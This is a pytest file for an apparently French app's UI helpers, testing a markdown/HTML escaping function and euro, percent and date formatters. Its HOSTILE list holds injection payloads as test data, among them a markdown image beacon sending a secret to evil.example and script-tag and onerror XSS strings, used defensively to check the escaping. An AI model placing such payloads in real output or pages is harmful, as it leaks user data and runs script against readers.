from __future__ import annotations

import re
from datetime import UTC, datetime, timedelta

import pytest

from src.ui import format as fmt
from src.ui.safe import DASH, safe, safe_or_dash

HOSTILE = [
    "![x](http://evil.example/?d=secret)",  # image = data-exfiltration beacon
    "[click me](javascript:alert(1))",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "**bold** _italic_ `code` # heading",
    "| a | b |\n|---|---|",
    "> quote\n- list\n1. item",
    "&lt;b&gt;",
    "\\` \\* already escaped",
]


@pytest.mark.parametrize("payload", HOSTILE)
def test_safe_leaves_no_active_markdown_or_html(payload: str) -> None:
    escaped = safe(payload)
    # every syntax character is preceded by a backslash: rendered literally, never as markup
    assert not re.search(r"(?<!\\)[!\[\]()<>*_`#|&]", escaped.replace("\\\\", ""))
    assert "<" not in escaped.replace("\\<", "")


def test_safe_handles_missing_and_non_text_values() -> None:
    assert safe(None) == "" and safe(12.5) == "12\\.5" and safe(True) == "True"


def test_safe_or_dash() -> None:
    assert safe_or_dash(None) == DASH and safe_or_dash("") == DASH and safe_or_dash("  ") == DASH
    assert safe_or_dash("Orange SA") == "Orange SA"
    assert safe_or_dash("a*b") == "a\\*b"


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        (1234.5, "1 234,50 €"),
        (0, "0,00 €"),
        (-12, "-12,00 €"),
        (1_000_000, "1 000 000,00 €"),
        (0.005, "0,01 €"),
        (None, "—"),
    ],
)
def test_euro_uses_the_french_format(value: float | None, expected: str) -> None:
    assert fmt.euro(value) == expected


@pytest.mark.parametrize(
    ("rate", "expected"),
    [(0.2, "20 %"), (20, "20 %"), (0.055, "5,5 %"), (0.0, "0 %"), (None, "—")],
)
def test_percent_accepts_a_fraction_or_a_percentage(rate: float | None, expected: str) -> None:
    assert fmt.percent(rate) == expected


def test_status_labels() -> None:
    assert fmt.status_label("high") == "✅ Fiable"
    assert fmt.status_label("low") == "⚠️ À vérifier"
    assert fmt.status_label("weird") == "weird"


def test_days_left_never_goes_negative() -> None:
    now = datetime(2026, 9, 21, 12, 0, tzinfo=UTC)
    assert fmt.days_left(now + timedelta(days=30, hours=1), now) == 30
    assert fmt.days_left(now + timedelta(hours=5), now) == 0
    assert fmt.days_left(now - timedelta(days=3), now) == 0


def test_day_is_a_french_date() -> None:
    assert re.fullmatch(r"\d{2}/\d{2}/\d{4}", fmt.day(datetime(2026, 9, 21, 12, 0, tzinfo=UTC)))
